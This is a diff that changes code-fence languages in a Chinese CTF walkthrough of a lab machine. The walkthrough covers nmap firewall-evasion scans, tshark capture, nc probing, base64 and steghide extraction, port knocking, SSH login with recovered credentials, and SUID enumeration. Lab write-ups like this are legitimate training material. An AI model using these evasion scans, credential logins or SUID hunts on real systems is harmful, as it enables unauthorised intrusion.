@@ -14,7 +14,7 @@ tags:
 
 # 端口和服务识别
 
-```
+```bash
 sudo nmap --min-rate 10000 -p- 10.10.10.20
 ```
 
@@ -24,7 +24,7 @@ sudo nmap --min-rate 10000 -p- 10.10.10.20
 
 ## 数据包分片扫描
 
-```
+```bash
 sudo nmap -f --min-rate 10000 -p- 10.10.10.20
 ```
 
@@ -34,7 +34,7 @@ sudo nmap -f --min-rate 10000 -p- 10.10.10.20
 
 ## 源端口伪装扫描
 
-```
+```bash
 sudo nmap --source-port 53 --min-rate 10000 -p- 10.10.10.20 
 ```
 
@@ -44,7 +44,7 @@ sudo nmap --source-port 53 --min-rate 10000 -p- 10.10.10.20
 
 ## 随机端口顺序扫描
 
-```
+```bash
 sudo nmap -r --min-rate 10000 -p- 10.10.10.20
 ```
 
@@ -54,7 +54,7 @@ sudo nmap -r --min-rate 10000 -p- 10.10.10.20
 
 ## TCP Windows 扫描
 
-```
+```bash
 sudo nmap --scanflags URGPSHFIN --min-rate 10000 -p- 10.10.10.20 
 ```
 
@@ -64,7 +64,7 @@ sudo nmap --scanflags URGPSHFIN --min-rate 10000 -p- 10.10.10.20
 
 ## 慢速扫描
 
-```
+```bash
 sudo nmap -T2 -p- 10.10.10.20
 ```
 
@@ -72,7 +72,7 @@ sudo nmap -T2 -p- 10.10.10.20
 
 # 流量分析
 
-```
+```bash
 tshark -i eth0 -f "host 10.10.10.20"
 ```
 
@@ -80,7 +80,7 @@ tshark -i eth0 -f "host 10.10.10.20"
 
 捕捉流量
 
-```
+```bash
 tshark -i eth0 -f "host 10.10.10.20" -w flu.pcap
 
 tshark -r flu.pcap
@@ -92,7 +92,7 @@ tshark -r flu.pcap -V
 
 转换为 ASCII 字符串
 
-```
+```bash
 tshark -r flu.pcap -T fields -e data | tr -d '' | xxd -r -p
 ```
 
@@ -100,7 +100,7 @@ tshark -r flu.pcap -T fields -e data | tr -d '' | xxd -r -p
 
 扫描 1440 端口
 
-```
+```bash
 sudo nmap -sT -sU -p1440 10.10.10.20
 ```
 
@@ -108,7 +108,7 @@ sudo nmap -sT -sU -p1440 10.10.10.20
 
 尝试连接 1440
 
-```
+```bash
 nc -u 10.10.10.20 1440
 ```
 
@@ -116,13 +116,13 @@ nc -u 10.10.10.20 1440
 
 此路不通通过管道符将发射密码给他试试
 
-```
+```bash
 echo "DS-1@OBS" | nc -u 10.10.10.20 1440 
 ```
 
 有一长串类似 base64 的回显，保存下来
 
-```
+```bash
 echo "DS-1@OBS" | nc -u 10.10.10.20 1440 | tee mass
 ```
 
@@ -130,7 +130,7 @@ echo "DS-1@OBS" | nc -u 10.10.10.20 1440 | tee mass
 
 解除 base64
 
-```
+```bash
 cat mass | base64 -d > x
 
 file x
@@ -140,7 +140,7 @@ file x
 
 发现是 jgp
 
-```
+```bash
 mv x x.jpg
 
 open x.jpg
@@ -154,7 +154,7 @@ open x.jpg
 
 查看隐写情况
 
-```
+```bash
 steghide extract -sf x.jpg
 ```
 
@@ -166,19 +166,19 @@ steghide extract -sf x.jpg
 
 # 端口敲门
 
-```
+```bash
 knock -v 10.10.10.20 197 719 801 983
 ```
 
 ![P19](P19.png)
 
-```
+```bash
 sudo nmap -sT -p10110 10.10.10.20
 ```
 
 ![P20](P20.png)
 
-```
+```bash
 sudo nmap -sT -sC -sV -p10110 10.10.10.20
 ```
 
@@ -190,7 +190,7 @@ sudo nmap -sT -sC -sV -p10110 10.10.10.20
 
 尝试连接
 
-```
+```bash
 sudo ssh root@10.10.10.20 -p 10110
 ```
 
@@ -198,7 +198,7 @@ sudo ssh root@10.10.10.20 -p 10110
 
 发现一个用户名为 erso，密码为 lyra13
 
-```
+```bash
 sudo ssh erso@10.10.10.20 -p 10110
 ```
 
@@ -210,7 +210,7 @@ sudo ssh erso@10.10.10.20 -p 10110
 
 查看 suid 位可执行文件
 
-```
+```bash
 find / -perm /u=s,g=s -type f 2>/dev/null
 ```
 
@@ -222,6 +222,6 @@ find / -perm /u=s,g=s -type f 2>/dev/null
 
 将文件拿到 kali 当中
 
-```
+```bash
 scp -P 10110 -q erso@10.10.10.20:/bin/dartVader .
 ```
